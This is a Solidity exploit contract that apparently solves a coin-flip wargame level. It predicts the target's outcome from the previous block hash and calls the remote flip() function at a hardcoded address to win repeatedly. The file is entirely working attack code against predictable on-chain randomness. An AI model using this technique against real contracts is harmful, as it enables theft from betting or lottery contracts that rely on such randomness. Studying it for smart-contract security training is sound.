pragma solidity ^0.8.0;

interface Coinflip {
    function flip(bool _guess) external returns(bool);
}

contract CoinFlipExploit {

  uint256 public consecutiveWins;
  uint256 public lastBlockNumber;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address remoteContractAddress = 0xfeBCa7396C600D4CDc8a6c86F20923c95f5282BC;


  constructor() {
    consecutiveWins = 0;
    lastBlockNumber = 0;

  }

  function flip_exploit() public {
    Coinflip remoteContract = Coinflip(remoteContractAddress);
    while (lastBlockNumber == block.number) {
    }

    lastBlockNumber = block.number;
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    bool succeeded = remoteContract.flip(side);
    
    if (succeeded) {
        consecutiveWins++;
    }
  }
}
